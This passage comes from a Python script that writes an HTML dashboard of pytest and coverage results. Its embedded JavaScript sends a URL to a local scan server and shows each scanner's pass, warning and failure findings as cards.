  const btn = document.getElementById('scanBtn');
  if (!inp || !btn) return;

  inp.addEventListener('keydown', e => {{ if (e.key === 'Enter') triggerScan(); }});
  btn.addEventListener('click', triggerScan);

  // Check if server is available when running as file://
  if (window.location.origin.startsWith("file:")) {{
    fetch(API_BASE + '/api/status', {{ signal: AbortSignal.timeout(1000) }})
      .then(() => document.getElementById('scanHint').textContent = 'Tblue scan server connected.')
      .catch(() => document.getElementById('scanHint').textContent =
        'Run  python scan_server.py  to enable live scanning.');
  }}
}});

async function triggerScan() {{
  if (_scanActive) return;
  const inp  = document.getElementById('scanUrl');
  const btn  = document.getElementById('scanBtn');
  const url  = inp.value.trim();
  if (!url) {{ inp.focus(); return; }}

  _scanActive = true;
  btn.disabled = true;
  btn.innerHTML = '<span class="spin">⟳</span> Scanning…';

  const panel = document.getElementById('scanResults');
  panel.style.display = 'block';
  panel.scrollIntoView({{ behavior: 'smooth', block: 'start' }});

  document.getElementById('scanProgressBar').style.width = '5%';
  document.getElementById('scanSummary').style.display = 'none';
  document.getElementById('scanCards').innerHTML = '';
  document.getElementById('scanProgressLabel').textContent = 'Running all scanners in parallel…';

  // Animate progress bar while waiting
  let pct = 5;
  const tick = setInterval(() => {{
    pct = Math.min(pct + (100 - pct) * 0.04, 92);
    document.getElementById('scanProgressBar').style.width = pct + '%';
  }}, 600);

  try {{
    const resp = await fetch(API_BASE + '/api/scan', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json' }},
      body: JSON.stringify({{ url }}),
    }});
    clearInterval(tick);
    if (!resp.ok) throw new Error('Server returned ' + resp.status);
    const data = await resp.json();
    renderScanResults(data);
  }} catch(err) {{
    clearInterval(tick);
    document.getElementById('scanProgressBar').style.width = '100%';
    document.getElementById('scanProgressBar').style.background = 'var(--fail)';
    document.getElementById('scanProgressLabel').textContent = 'Error: ' + err.message +
      (API_BASE ? '' : ' — Make sure scan_server.py is running.');
  }} finally {{
    _scanActive = false;
    btn.disabled = false;
    btn.innerHTML = '&#9654; Scan';
  }}
}}

function renderScanResults(data) {{
  const s = data.summary || {{}};
  document.getElementById('scanProgressBar').style.width = '100%';
  document.getElementById('scanProgressLabel').textContent =
    `Scan complete in ${{data.duration}}s — ${{s.fail}} critical, ${{s.warn}} warnings, ${{s.pass}} passed`;

  // Summary counts
  document.getElementById('scanCountFail').textContent  = s.fail  || 0;
  document.getElementById('scanCountWarn').textContent  = s.warn  || 0;
  document.getElementById('scanCountPass').textContent  = s.pass  || 0;
  document.getElementById('scanCountTotal').textContent = s.total || 0;
  document.getElementById('scanSummary').style.display  = 'grid';

  // Scanner cards
  const grid = document.getElementById('scanCards');
  grid.innerHTML = '';
  const scanners = data.scanners || [];

  scanners.forEach(sc => {{
    const findings = sc.findings || [];
    const fails = findings.filter(f => f.status === 'FAIL').length;
    const warns = findings.filter(f => f.status === 'WARN').length;
    const passes = findings.filter(f => f.status === 'PASS').length;
    const hasFindings = findings.length > 0 || sc.error;

    let borderColor = 'var(--border)';
    if (fails > 0)       borderColor = '#991b1b';
    else if (warns > 0)  borderColor = '#92400e';
    else if (passes > 0) borderColor = '#166534';

    let badgesHtml = '';
    if (sc.error)  badgesHtml += `<span class="scan-count sc-fail">ERR</span>`;
    if (fails > 0)  badgesHtml += `<span class="scan-count sc-fail">${{fails}} FAIL</span>`;
    if (warns > 0)  badgesHtml += `<span class="scan-count sc-warn">${{warns}} WARN</span>`;
    if (passes > 0) badgesHtml += `<span class="scan-count sc-pass">${{passes}} PASS</span>`;
    if (!hasFindings) badgesHtml = `<span class="scan-count sc-ok">no data</span>`;

    let bodyHtml = '';
    if (sc.error) {{
      bodyHtml += `<div class="scan-error">Error: ${{escHtml(sc.error)}}</div>`;
    }}
    findings.forEach(f => {{
      const cls = f.status === 'FAIL' ? 'dot-fail' : f.status === 'WARN' ? 'dot-warn' : 'dot-pass';
      const detail = f.detail ? `<div class="scan-finding-detail">${{escHtml(f.detail.slice(0,220))}}${{f.detail.length > 220 ? '…' : ''}}</div>` : '';
      bodyHtml += `
        <div class="scan-finding">
          <div class="scan-finding-dot ${{cls}}"></div>
          <div class="scan-finding-text">
            ${{escHtml(f.type || f.status)}}
            ${{detail}}
          </div>
        </div>`;
    }});

    const card = document.createElement('div');
    card.className = 'scan-scanner-card' + (hasFindings ? '' : ' collapsed');
    card.style.borderColor = borderColor;
    card.innerHTML = `
      <div class="scan-scanner-header${{hasFindings ? ' has-findings' : ''}}" onclick="toggleCard(this)">
        <div>
          <div class="scan-scanner-name">${{escHtml(sc.scanner)}}</div>
          <div class="scan-scanner-cat">${{escHtml(sc.category || '')}}</div>
        </div>
        <div style="display:flex;align-items:center;gap:8px">
          <div class="scan-badge-row">${{badgesHtml}}</div>
          ${{hasFindings ? '<span class="scan-chevron">&#9660;</span>' : ''}}
        </div>
      </div>
      <div class="scan-scanner-body">${{bodyHtml}}</div>`;
    grid.appendChild(card);
  }});
}}

function toggleCard(header) {{
  const card = header.closest('.scan-scanner-card');
  card.classList.toggle('collapsed');
}}

function escHtml(s) {{
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}}
</script>
<style>
.spin {{ display:inline-block; animation:spin 1s linear infinite; }}
@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
</style>
</body>
</html>"""


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--skip-run", action="store_true", help="Use existing JSON files, skip pytest run")
    args = parser.parse_args()

    if not args.skip_run:
        run_tests()

    if not os.path.exists(REPORT_JSON):
        print(f"ERROR: {REPORT_JSON} not found. Run without --skip-run first.")
        sys.exit(1)
    if not os.path.exists(COVERAGE_JSON):
        print(f"ERROR: {COVERAGE_JSON} not found. Run without --skip-run first.")
        sys.exit(1)

    print("Loading results…")
    report   = load_json(REPORT_JSON)
    coverage = load_json(COVERAGE_JSON)

    print("Building dashboard…")
    html = build_html(report, coverage)

    output = Path(OUTPUT_HTML)
    output.write_text(html, encoding="utf-8")
    print(f"\n✓ Dashboard written → {output.resolve()}")
    print(f"  Open in browser:  open {output.resolve()}")


if __name__ == "__main__":
    main()
